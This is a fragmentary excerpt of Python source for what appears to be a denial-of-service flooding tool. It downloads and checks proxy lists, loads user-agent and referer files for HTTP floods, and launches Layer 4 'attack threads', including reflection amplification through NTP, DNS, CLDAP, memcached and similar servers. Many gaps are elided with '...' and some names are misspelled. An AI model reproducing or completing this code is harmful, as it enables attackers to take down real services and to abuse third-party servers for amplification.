...
class ProxyManager:
    ...
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        ...
        logger.info(
            f"Downloading proxies from {len(providrs)} providers")
    ...
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"Proxies from (URL: {provider['url']}, Type: {proxy_type.name}, Timeout: {provider['timeout']})")
        proxes: Set[Proxy] = set()
...
class ToolsConsole:
    ...
    def usage():
        print((
                  ...
                  '      If the proxy file does not exist, the script will download proxies and check them.\n'
...
def handleProxyList(con, proxy_li, proxy_ty, url=None):
    ...
    if not proxy_li.exists():
        logger.warning(
            f"The file does not exist. Creating files and downloading proxies.")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{len(Proxies):,} proxies are being checked. This may take a while."
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5.5, threads=threads,
            ...
            if not Proxies:
                exit(
                    ...
                    " or the target may not be available."
                )
            stringBuilder = ""
    ...
    if proxies:
        ...
        logger.info(
            f"Empty proxy file. Running flood without proxies.")
        proxies = None
        ...
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                if not useragent_li.exists():
                    exit("The user-agent file does not exist.")
                if not referers_li.exists():
                    exit("The referer file does not exist.")
                ...
                if not uagents: exit("Empty user-agent file.")
                if not referers: exit("Empty referer file.")

                if threads > 1000:
                    logger.warning("Thread count is higher than 1000.")
                if rpc > 100:
                    logger.warning(
                        "RPC (Requests Per Connection) is higher than 100.")

                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                
                logger.info(f"Starting {threads} attack threads...")
            ...
            if method in Methods.LAYER4_METHODS:
                ...
                if method in Methods.LAYER4_AMP:
                    logger.warning("This method requires spoofable servers. Please check:")
                    ...
                    if argfive:
                        ...
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                            if not refl_li.exists():
                                exit("The reflector file does not exist.")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                            ref = set(a.strip()
                            ...
                            if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                exit("This method cannot be used with Layer 4 proxies.")
                ...
                logger.info(f"Starting {threads} attack threads...")
                for thread_id in range(threads):
                    Layer4(thread_id, (target, port), ref, method, event,
